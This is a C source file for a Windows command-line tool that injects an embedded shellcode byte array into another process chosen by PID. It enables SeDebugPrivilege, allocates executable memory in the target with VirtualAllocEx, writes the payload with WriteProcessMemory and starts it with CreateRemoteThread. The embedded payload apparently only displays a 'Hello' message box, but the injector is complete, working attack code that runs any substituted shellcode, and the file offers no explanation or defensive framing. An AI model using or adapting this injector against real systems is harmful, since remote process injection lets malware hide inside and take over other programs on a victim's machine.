#include <Windows.h>
#include <tchar.h>
#include <stdio.h>


BYTE Shellcode[] = {
	0x48,0x83,0xec,0x28,0x65,0x48,0x8b,0x04,0x25,0x30,0x00,0x00,0x00,0x48,0x8b,0x48,
	0x60,0x48,0x8b,0x41,0x18,0x4c,0x8b,0x40,0x20,0x49,0x8b,0xc8,0x48,0x8b,0x09,0x41,
	0xb9,0xdf,0xff,0x00,0x00,0x48,0x8b,0x51,0x40,0x0f,0xb7,0x42,0x28,0x66,0x83,0xe8,
	0x4b,0x66,0x41,0x85,0xc1,0x75,0x0e,0x66,0x83,0x7a,0x34,0x33,0x75,0x07,0x66,0x83,
	0x7a,0x36,0x32,0x74,0x41,0x49,0x3b,0xc8,0x75,0xd2,0x33,0xc9,0xba,0x76,0x2c,0x1d,
	0x07,0xe8,0x3a,0x00,0x00,0x00,0x48,0x8d,0x0d,0xfb,0x00,0x00,0x00,0xff,0xd0,0xba,
	0xcf,0x4c,0xe5,0x4c,0x48,0x8b,0xc8,0xe8,0x24,0x00,0x00,0x00,0x45,0x33,0xc9,0x4c,
	0x8d,0x05,0xf2,0x00,0x00,0x00,0x48,0x8d,0x15,0xf3,0x00,0x00,0x00,0x33,0xc9,0x48,
	0x83,0xc4,0x28,0x48,0xff,0xe0,0x48,0x8b,0x49,0x20,0xeb,0xc0,0x00,0x00,0x00,0x00,
	0x48,0x89,0x74,0x24,0x08,0x48,0x89,0x7c,0x24,0x10,0x48,0x63,0x41,0x3c,0x4c,0x8b,
	0xc1,0x8b,0xf2,0x44,0x8b,0x94,0x08,0x88,0x00,0x00,0x00,0x4c,0x03,0xd1,0x45,0x8b,
	0x4a,0x20,0x41,0x8b,0x7a,0x1c,0x4c,0x03,0xc9,0x48,0x03,0xf9,0x33,0xc9,0x41,0x3b,
	0x4a,0x18,0x73,0x33,0x41,0x8b,0x11,0x49,0x03,0xd0,0x45,0x33,0xdb,0xeb,0x0d,0x45,
	0x6b,0xdb,0x21,0x0f,0xbe,0xc0,0x44,0x03,0xd8,0x48,0xff,0xc2,0x8a,0x02,0x84,0xc0,
	0x75,0xed,0x44,0x3b,0xde,0x74,0x0c,0xff,0xc1,0x49,0x83,0xc1,0x04,0x41,0x3b,0x4a,
	0x18,0x72,0xd1,0x41,0x3b,0x4a,0x18,0x74,0x15,0x8b,0xd1,0x41,0x8b,0x4a,0x24,0x49,
	0x03,0xc8,0x0f,0xb7,0x04,0x51,0x8b,0x04,0x87,0x49,0x03,0xc0,0xeb,0x02,0x33,0xc0,
	0x48,0x8b,0x74,0x24,0x08,0x48,0x8b,0x7c,0x24,0x10,0xc3,0x00,0x00,0x00,0x00,0x00,
	0x01,0x04,0x01,0x00,0x04,0x42,0x00,0x00,0x00,0x00,0x00,0x00,0x8c,0x00,0x00,0x00,
	0x20,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x0a,0x04,0x00,0x0a,0x74,0x02,0x00,
	0x05,0x64,0x01,0x00,0x00,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x1b,0x01,0x00,0x00,
	0x38,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,
	0x6c,0x6c,0x00,0x00,0x00,0x00,0x00,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x00,
	0x48,0x65,0x6c,0x6c,0x6f,0x00
};


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);

int _tmain(int argc, TCHAR* argv[]) {

	if (argc != 2) {
		_tprintf(_T("[!] Usage: main.exe [pid]\n"));
		return 0;
	}

	DWORD PID = _tstoi(argv[1]);
	if (PID == 0) {
		_tprintf(_T("[x] Invalid PID\n"));
		return 0;
	}

	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);
	if (hProcess == NULL) {
		_tprintf(_T("[x] OpenProcess failed, error: 0x%x\n"), GetLastError());
		return 0;
	}

	PVOID Buffer = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (Buffer == NULL) {
		_tprintf(_T("[x] VirtualAllocEx failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	SIZE_T bytesWritten;
	WriteProcessMemory(hProcess, Buffer, Shellcode, sizeof(Shellcode), &bytesWritten);
	if (bytesWritten != sizeof(Shellcode)) {
		_tprintf(_T("[x] WriteProcessMemory failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	DWORD ThreadId;
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, &ThreadId);
	if (hThread == NULL) {
		_tprintf(_T("[x] CreateRemoteThread failed, error: 0x%x\n"), GetLastError());
		CloseHandle(hProcess);
		return 0;
	}

	_tprintf(_T("[+] Success, ThreadId = 0x%x (%d)\n"), ThreadId, ThreadId);

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		TOKEN_PRIVILEGES tp;

		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
		//
		//  Enable the privilege or disable all privileges.
		//
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		{
			//
			//  Check to see if you have proper access.
			//  You may get "ERROR_NOT_ALL_ASSIGNED".
			//
			bRet = (GetLastError() == ERROR_SUCCESS);
		}
	}
	return bRet;
}
